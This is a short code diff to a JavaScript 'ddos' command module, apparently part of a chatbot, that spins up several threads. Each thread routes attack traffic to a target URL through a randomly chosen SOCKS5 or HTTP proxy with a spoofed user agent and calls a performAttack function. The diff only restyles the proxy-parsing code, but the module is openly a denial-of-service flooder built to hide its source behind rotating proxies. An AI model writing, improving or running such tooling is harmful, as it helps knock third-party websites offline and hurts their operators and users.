@@ -3,7 +3,9 @@ const fs = require("fs");
 const path = require("path");
 const SocksProxyAgent = require("socks-proxy-agent");
 const HttpsProxyAgent = require("https-proxy-agent");
-const { generateUserAgent } = require("../system/useragent.js");
+const {
+    generateUserAgent
+} = require("../system/useragent.js");
 
 module.exports["config"] = {
     name: "ddos",
@@ -129,15 +131,13 @@ module.exports["run"] = async ({
 
     for (let i = 0; i < numThreads; i++) {
         const randomProxy = getRandomElement(proxies);
-        const [host, port] = randomProxy.split(":");
-        let agent;
+        const proxyParts = randomProxy.split(":");
 
-        const proxyProtocol = host.startsWith("socks") ? "socks5" : "http";
-        const proxyUrl = `${proxyProtocol}://${host}:${port}`;
+        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5": "http";
+        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
 
-        agent = proxyProtocol === "socks5"
-            ? new SocksProxyAgent(proxyUrl)
-            : new HttpsProxyAgent(proxyUrl);
+        const agent = proxyProtocol === "socks5"
+        ? new SocksProxyAgent(proxyUrl): new HttpsProxyAgent(proxyUrl);
 
         performAttack(targetUrl, agent, headers, () => (continueAttack = false));
     }
